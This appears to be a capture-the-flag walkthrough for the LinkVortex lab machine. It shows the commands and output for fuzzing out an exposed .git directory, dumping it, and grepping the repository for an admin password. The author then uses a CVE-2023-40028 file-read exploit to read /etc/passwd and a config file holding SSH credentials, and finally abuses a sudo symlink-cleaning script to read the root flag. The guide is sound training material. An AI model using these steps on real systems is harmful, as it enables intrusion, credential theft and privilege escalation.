+</p><h1 id="8921f7d5-04a6-4be5-9416-39c78f52b324" class="">User</h1><p id="5350679e-313d-428c-ac74-87cc62ff5983" class="">Fuzzing dir on dev.linkvortex.htb</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-80cd-afb7-f642f7860f66" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ -t 50 --hc 404 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://dev.linkvortex.htb/FUZZ
+Total requests: 4734
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000009:   301        7 L      20 W       239 Ch      &quot;.git&quot;                                              
+000000011:   200        1 L      1 W        41 Ch       &quot;.git/HEAD&quot;                                         
+000000012:   200        8 L      21 W       201 Ch      &quot;.git/config&quot;                                       
+000000014:   200        15 L     53 W       868 Ch      &quot;.git/logs/&quot;                                        
+000000024:   403        7 L      20 W       199 Ch      &quot;.hta&quot;                                              
+000000025:   403        7 L      20 W       199 Ch      &quot;.htaccess&quot;                                         
+000000026:   403        7 L      20 W       199 Ch      &quot;.htpasswd&quot;                                         
+000000013:   200        2171 L   11755 W    699043 Ch   &quot;.git/index&quot;                                        
+000001044:   403        7 L      20 W       199 Ch      &quot;cgi-bin/&quot;                                          
+000002204:   200        115 L    255 W      2538 Ch     &quot;index.html&quot;                                        
+000003727:   403        7 L      20 W       199 Ch      &quot;server-status&quot;                                     
+
+Total time: 0
+Processed Requests: 4734
+Filtered Requests: 4723
+Requests/sec.: 0
+</code></pre><p id="7af31562-e838-4585-a56f-d586fba71332" class="">
+</p><p id="26908806-5b82-41b7-9751-8db6f795bb65" class="">Let’s leak .git files with <a href="https://github.com/arthaud/git-dumper">gitdumper</a></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-8012-9722-eab2cdd8933d" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/git-dumper]
+└─$ python3 git_dumper.py http://dev.linkvortex.htb/ linkvortex.htb
+/home/drroot/Desktop/.htb/git-dumper/git_dumper.py:409: SyntaxWarning: invalid escape sequence &#x27;\g&#x27;
+  modified_content = re.sub(UNSAFE, &#x27;# \g&lt;0&gt;&#x27;, content, flags=re.IGNORECASE)
+[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
+[-] Testing http://dev.linkvortex.htb/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
+[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
+[-] Fetching http://dev.linkvortex.htb/.git/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
+[-] Fetching http://dev.linkvortex.htb/.git/config [200]
+[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
+[-] Fetching http://dev.linkvortex.htb/.git/index [200]
+[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/description [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
+[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
+[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
+[-] Sanitizing .git/config
+[-] Running git checkout .
+Updated 5596 paths from the index
+</code></pre><p id="e7ccda83-d1e5-42f3-9046-4dd879cd11c6" class="">
+</p><p id="73da704e-9b7f-4217-a38b-4a6a4ed1b45b" class="">Search for password</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-8023-a349-ec88b6d4e4ac" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb/git-dumper/linkvortex.htb]
+└─$ find . -type f -exec grep -HnA2 &quot;password =&quot; {} \;
+./ghost/core/core/cli/README.md:63:const password = await this.secret(&#x27;Password:&#x27;);
+./ghost/core/core/cli/README.md-64-this.log(`Your password is: ${password}`);
+./ghost/core/core/cli/README.md-65-```
+./ghost/core/test/unit/frontend/apps/private-blogging/input_password.test.js:5:const input_password = require(&#x27;../../../../../core/frontend/apps/private-blogging/lib/helpers/input_password&#x27;);
+./ghost/core/test/unit/frontend/apps/private-blogging/input_password.test.js-6-
+./ghost/core/test/unit/frontend/apps/private-blogging/input_password.test.js-7-describe(&#x27;{{input_password}} helper&#x27;, function () {
+./ghost/core/test/utils/agents/admin-api-test-agent.js:34:            password = user.password;
+./ghost/core/test/utils/agents/admin-api-test-agent.js-35-        }
+./ghost/core/test/utils/agents/admin-api-test-agent.js-36-
+./ghost/core/test/regression/api/admin/authentication.test.js:56:            const password = &#x27;OctopiFociPilfer45&#x27;;
+./ghost/core/test/regression/api/admin/authentication.test.js-57-
+./ghost/core/test/regression/api/admin/authentication.test.js-58-            const requestMock = nock(&#x27;https://api.github.com&#x27;)
+--
+./ghost/core/test/regression/api/admin/authentication.test.js:195:            const password = &#x27;thisissupersafe&#x27;;
+./ghost/core/test/regression/api/admin/authentication.test.js-196-
+./ghost/core/test/regression/api/admin/authentication.test.js-197-            const requestMock = nock(&#x27;https://api.github.com&#x27;)
+./ghost/core/test/e2e-browser/utils/e2e-browser-utils.js:48:        ownerUser.password = process.env.TEST_OWNER_PASSWORD;
+./ghost/core/test/e2e-browser/utils/e2e-browser-utils.js-49-    }
+./ghost/core/test/e2e-browser/utils/e2e-browser-utils.js-50-
+./ghost/security/lib/tokens.js:43:        const password = options.password;
+./ghost/security/lib/tokens.js-44-        let text = &#x27;&#x27;;
+./ghost/security/lib/tokens.js-45-
+--
+./ghost/security/lib/tokens.js:84:        const password = options.password;
+./ghost/security/lib/tokens.js-85-        let generatedToken;
+./ghost/security/lib/tokens.js-86-        let diff = 0;
+./ghost/admin/tests/acceptance/signin-test.js:41:                if (password === &#x27;thisissupersafe&#x27;) {
+./ghost/admin/tests/acceptance/signin-test.js-42-                    return new Response(201);
+./ghost/admin/tests/acceptance/signin-test.js-43-                } else {
+./ghost/admin/app/controllers/settings/staff/user.js:201:        this.user.password = &#x27;&#x27;;
+./ghost/admin/app/controllers/settings/staff/user.js-202-        this.user.newPassword = &#x27;&#x27;;
+./ghost/admin/app/controllers/settings/staff/user.js-203-        this.user.ne2Password = &#x27;&#x27;;
+./ghost/admin/app/controllers/settings/general.js:103:            settings.password = randomPassword();
+./ghost/admin/app/controllers/settings/general.js-104-
+./ghost/admin/app/controllers/settings/general.js-105-        // reset the password when isPrivate is disabled
+--
+./ghost/admin/app/controllers/settings/general.js:107:            settings.password = changedAttrs.password[0];
+./ghost/admin/app/controllers/settings/general.js-108-        }
+./ghost/admin/app/controllers/settings/general.js-109-    }
+./ghost/admin/app/controllers/setup.js:33:    password = null;
+./ghost/admin/app/controllers/setup.js-34-
+./ghost/admin/app/controllers/setup.js-35-    @action
+./ghost/admin/app/validators/signin.js:20:        let password = model.password;
+./ghost/admin/app/validators/signin.js-21-
+./ghost/admin/app/validators/signin.js-22-        model.errors.clear();
+./ghost/admin/app/validators/mixins/password.js:58:        password = password || model.password;
+./ghost/admin/app/validators/mixins/password.js-59-        errorTarget = errorTarget || &#x27;password&#x27;;
+./ghost/admin/app/validators/mixins/password.js-60-
+--
+./ghost/admin/app/validators/mixins/password.js:72:        password = password.toString();
+./ghost/admin/app/validators/mixins/password.js-73-
+./ghost/admin/app/validators/mixins/password.js-74-        // dissallow password from badPasswords list (e. g. &#x27;1234567890&#x27;)
+./ghost/admin/app/validators/setting.js:27:        let password = model.password;
+./ghost/admin/app/validators/setting.js-28-
+./ghost/admin/app/validators/setting.js:29:        if (isPrivate &amp;&amp; password === &#x27;&#x27;) {
+./ghost/admin/app/validators/setting.js-30-            model.errors.add(&#x27;password&#x27;, &#x27;Password must be supplied&#x27;);
+./ghost/admin/app/validators/setting.js-31-            this.invalidate();
+./ghost/admin/app/models/user.js:128:            this.password = &#x27;&#x27;;
+./ghost/admin/app/models/user.js-129-            this.newPassword = &#x27;&#x27;;
+./ghost/admin/app/models/user.js-130-            this.ne2Password = &#x27;&#x27;;
+./ghost/admin/app/routes/signin.js:11:    @tracked password = &#x27;&#x27;;
+./ghost/admin/app/routes/signin.js-12-
+./ghost/admin/app/routes/signin.js-13-    errors = Errors.create();
+./ghost/admin/app/routes/signup.js:14:    @tracked password = &#x27;&#x27;;
+./ghost/admin/app/routes/signup.js-15-
+./ghost/admin/app/routes/signup.js-16-    token = &#x27;&#x27;;
+--
+./ghost/admin/app/routes/signup.js:92:        signupDetails.password = &#x27;&#x27;;
+./ghost/admin/app/routes/signup.js-93-        signupDetails.token = &#x27;&#x27;;
+./ghost/admin/app/routes/signup.js-94-    }
+./ghost/admin/app/components/editor/modals/re-authenticate.js:16:    @tracked password = &#x27;&#x27;;
+./ghost/admin/app/components/editor/modals/re-authenticate.js-17-
+./ghost/admin/app/components/editor/modals/re-authenticate.js-18-    validationType = &#x27;signin&#x27;;
+--
+./ghost/admin/app/components/editor/modals/re-authenticate.js:43:        this.signin.password = event.target.value;
+./ghost/admin/app/components/editor/modals/re-authenticate.js-44-    }
+./ghost/admin/app/components/editor/modals/re-authenticate.js-45-
+                                                                                                       </code></pre><p id="16fd1b9f-8847-80e3-ad1b-f2f152323e82" class="">
+</p><p id="58ce9ef5-8d15-407a-8b91-a35d02441ff4" class="">2 possible passwords</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-8084-bfd2-e8f6a613f641" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const password = &#x27;OctopiFociPilfer45&#x27;; -&gt; this works
+const password = &#x27;thisissupersafe&#x27;;
+
+So creds
+admin@linkvortex.htb:OctopiFociPilfer45</code></pre><figure id="16fd1b9f-8847-803a-8da0-f94a418a50f6" class="image"><a href="../img/Linkvortex/image 5.png"><img style="width:707.96875px" src="../img/Linkvortex/image 5.png"/></a></figure><p id="16fd1b9f-8847-80b8-b314-d139b5fd422e" class="">
+</p><p id="16fd1b9f-8847-8077-bd6d-c4a68c5fada3" class="">I can read files with this <a href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028">payload</a></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-80d5-a1c8-cc3b7d984a96" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
+└─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/
+WELCOME TO THE CVE-2023-40028 SHELL
+Enter the file path to read (or type &#x27;exit&#x27; to quit): /etc/passwd
+File content:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+</code></pre><p id="16fd1b9f-8847-80f1-a8e1-dc521d93622a" class="">On Dockerfile.ghost found juicy information</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-8036-979b-c9f11296df79" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">ROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT [&quot;/entry.sh&quot;]
+CMD [&quot;node&quot;, &quot;current/index.js&quot;]</code></pre><p id="16fd1b9f-8847-80df-9832-d11dd6e58dba" class="">Let’s read /var/lib/ghost/config.production.json</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-806b-b1d2-d39f5fbc9381" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
+└─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/
+WELCOME TO THE CVE-2023-40028 SHELL
+Enter the file path to read (or type &#x27;exit&#x27; to quit): /var/lib/ghost/config.production.json
+File content:
+{
+  &quot;url&quot;: &quot;http://localhost:2368&quot;,
+  &quot;server&quot;: {
+    &quot;port&quot;: 2368,
+    &quot;host&quot;: &quot;::&quot;
+  },
+  &quot;mail&quot;: {
+    &quot;transport&quot;: &quot;Direct&quot;
+  },
+  &quot;logging&quot;: {
+    &quot;transports&quot;: [&quot;stdout&quot;]
+  },
+  &quot;process&quot;: &quot;systemd&quot;,
+  &quot;paths&quot;: {
+    &quot;contentPath&quot;: &quot;/var/lib/ghost/content&quot;
+  },
+  &quot;spam&quot;: {
+    &quot;user_login&quot;: {
+        &quot;minWait&quot;: 1,
+        &quot;maxWait&quot;: 604800000,
+        &quot;freeRetries&quot;: 5000
+    }
+  },
+  &quot;mail&quot;: {
+     &quot;transport&quot;: &quot;SMTP&quot;,
+     &quot;options&quot;: {
+      &quot;service&quot;: &quot;Google&quot;,
+      &quot;host&quot;: &quot;linkvortex.htb&quot;,
+      &quot;port&quot;: 587,
+      &quot;auth&quot;: {
+        &quot;user&quot;: &quot;bob@linkvortex.htb&quot;,
+        &quot;pass&quot;: &quot;fibber-talented-worth&quot;
+        }
+      }
+    }
+}
+</code></pre><p id="16fd1b9f-8847-805e-beda-dd2a52af4e0e" class="">SSH</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-807e-83bc-f42f63d5f437" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ ssh bob@linkvortex.htb          
+bob@linkvortex.htb&#x27;s password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the &#x27;unminimize&#x27; command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Jan  2 01:01:00 2025 from 10.10.16.2
+bob@linkvortex:~$ cat user.txt 
+5*******************************2
+</code></pre><p id="16fd1b9f-8847-803b-b31f-d2b45f9a68c2" class="">
+</p><h1 id="0949bdd2-91ad-490b-97c3-377eba8a781d" class="">Root</h1><p id="1034f306-dfeb-4133-83eb-9ebea6639e84" class="">Run <a href="http://linpeas.sh">linpeas.sh</a> and commands for information gathering</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-80bf-b0bc-ef2c234e5bfe" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:2368          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:38025         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -     
+
+
+
+
+Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+
+
+╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
+Apache version: Server version: Apache/2.4.52 (Ubuntu)
+Server built:   2024-07-17T18:57:26
+httpd Not Found
+
+</code></pre><p id="16fd1b9f-8847-809a-a101-d53d53ce960a" class="">Read clean_symlink.sh</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-8076-9106-d7171329eea0" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
+#!/bin/bash
+
+QUAR_DIR=&quot;/var/quarantined&quot;
+
+if [ -z $CHECK_CONTENT ];then
+  CHECK_CONTENT=false
+fi
+
+LINK=$1
+
+if ! [[ &quot;$LINK&quot; =~ \.png$ ]]; then
+  /usr/bin/echo &quot;! First argument must be a png file !&quot;
+  exit 2
+fi
+
+if /usr/bin/sudo /usr/bin/test -L $LINK;then
+  LINK_NAME=$(/usr/bin/basename $LINK)
+  LINK_TARGET=$(/usr/bin/readlink $LINK)
+  if /usr/bin/echo &quot;$LINK_TARGET&quot; | /usr/bin/grep -Eq &#x27;(etc|root)&#x27;;then
+    /usr/bin/echo &quot;! Trying to read critical files, removing link [ $LINK ] !&quot;
+    /usr/bin/unlink $LINK
+  else
+    /usr/bin/echo &quot;Link found [ $LINK ] , moving it to quarantine&quot;
+    /usr/bin/mv $LINK $QUAR_DIR/
+    if $CHECK_CONTENT;then
+      /usr/bin/echo &quot;Content:&quot;
+      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null
+    fi
+  fi
+fi
+</code></pre><p id="16fd1b9f-8847-80d4-99d4-da34667d1bc6" class="">
+</p><p id="16fd1b9f-8847-8093-a86b-cc46530afabc" class="">After read the .sh file, need to create linked references/file</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-809e-975a-e3c0cbb85397" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">bob@linkvortex:~$ ln -s /root/root.txt flag.txt
+bob@linkvortex:~$ ln -s /home/bob/flag.txt flag.png
+bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/flag.png 
+Link found [ /home/bob/flag.png ] , moving it to quarantine
+Content:
+7*******************************5
+</code></pre><p id="16fd1b9f-8847-80cc-947e-d4ff86b2250f" class="">
